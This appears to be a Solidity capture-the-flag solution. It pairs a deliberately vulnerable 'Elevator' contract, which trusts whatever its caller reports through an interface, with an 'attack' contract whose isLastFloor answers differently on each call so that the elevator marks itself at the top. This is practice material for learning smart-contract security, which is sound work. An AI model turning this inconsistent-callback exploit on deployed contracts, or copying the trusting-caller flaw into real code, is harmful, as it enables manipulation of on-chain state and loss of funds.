// Save this in Remix as Elevator.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


// i had issues with the deployment of the Attack solution, so i saved the vulnerable contract above in `Elevator.sol` 
// and the solution in `attack.sol` and import it here

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Elevator.sol";

contract attack{
  Elevator public elevator;
  uint public count;

  constructor(address addr){
    elevator = Elevator(addr);
  }

  function isLastFloor(uint) public returns(bool){
    count++;
    return count > 1;
  }
  function pwn() public {
    elevator.goTo(0);
  }
}

